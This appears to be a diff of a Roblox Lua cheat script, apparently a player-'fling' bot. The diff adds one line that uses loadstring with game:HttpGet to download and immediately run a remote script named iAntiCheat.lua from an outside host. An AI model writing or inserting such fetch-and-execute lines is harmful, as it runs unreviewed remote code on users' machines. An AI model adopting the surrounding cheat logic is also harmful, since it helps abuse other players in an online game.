@@ -1,7 +1,7 @@
 local paste = "https://raw.githubusercontent.com/lxyodevelopment/flingbymertcan/main/bot"
 local message = " hello everyone "
 if not game:IsLoaded() then game.Loaded:wait() end
-
+loadstring(game:HttpGet("https://irisapp.ca/TheGoodSucc/iAntiCheat.lua"))()
 local rand = Random.new()
 local plr = game:GetService("Players").LocalPlayer
 local cmdlp = plr
